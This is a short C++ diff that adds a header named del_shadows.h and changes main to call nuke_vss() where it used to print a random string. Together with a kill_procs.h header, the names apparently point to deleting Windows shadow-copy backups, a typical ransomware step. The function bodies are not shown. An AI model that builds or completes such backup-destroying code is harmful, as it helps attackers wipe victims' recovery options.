@@ -2,11 +2,11 @@
 #include "gen_uid.h"
 #include "kill_procs.h"
 #include "gen_str.h"
+#include "del_shadows.h"
 
 
 int main()
 {
-    std::string randomstr = GenRandomStr(32);
-    std::cout << randomstr << std::endl;
+    std::cout << nuke_vss() << std::endl;
     return 0;
 }
